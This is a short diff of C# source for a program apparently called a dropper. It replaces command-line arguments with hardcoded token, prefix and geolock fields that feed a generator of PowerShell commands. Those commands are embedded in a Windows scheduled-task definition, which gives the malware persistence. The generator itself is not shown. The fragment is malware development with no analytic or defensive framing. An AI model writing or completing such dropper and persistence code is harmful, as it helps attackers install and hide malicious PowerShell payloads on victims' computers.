@@ -8,6 +8,10 @@ namespace dropper
 {
     internal class Program
     {
+        private static string token = "";
+        private static string prefix = "";
+        private static string geolock = "";
+
         static void Main(string[] args)
         {
             Process schproc = new Process()
@@ -67,7 +71,7 @@ namespace dropper
   <Actions Context=""Author"">
     <Exec>
       <Command>powershell.exe</Command>
-      <Arguments>" + PGen.GenerateCommand(args[0], args[1], args[2], new Random()) + @"</Arguments>
+      <Arguments>" + PGen.GenerateCommand(token, prefix, geolock, new Random()) + @"</Arguments>
     </Exec>
   </Actions>
 </Task>");
